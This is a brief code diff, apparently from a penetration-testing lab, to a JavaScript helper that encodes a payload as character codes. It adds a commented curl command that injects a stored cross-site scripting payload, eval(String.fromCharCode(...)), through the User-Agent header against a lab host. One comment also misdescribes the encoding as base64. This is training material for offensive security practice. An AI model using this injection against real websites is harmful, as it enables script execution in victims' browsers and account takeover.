@@ -28,9 +28,12 @@ function encode_to_javascript(string) {
             }
             return output;
         }
-        
+
+// Get base64 encoding of payload        
 let encoded = encode_to_javascript('insert_minified_javascript')
 console.log(encoded)
 
+
+//curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(ALLTHENUMBERSFROMENCODED))</script>" --proxy 127.0.0.1:8080
 
   
